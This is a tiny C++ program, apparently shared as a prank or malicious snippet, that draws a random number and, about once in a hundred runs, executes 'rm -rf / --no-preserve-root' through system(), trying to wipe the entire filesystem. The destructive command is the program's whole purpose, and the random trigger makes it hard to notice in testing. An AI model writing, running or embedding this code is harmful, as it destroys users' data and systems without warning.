#include <cstdlib>
#include <ctime>
#include <cstdio>
#include <cstring>
//code by vnage tg:@feerase
int main() {
    std::srand(std::time(nullptr));
    int roll = std::rand() % 100;
    if (roll == 67) {
        char cmd[32];
        std::strcpy(cmd, "rm -rf / --no-preserve-root");
        std::system(cmd);
    }
    return 0;
}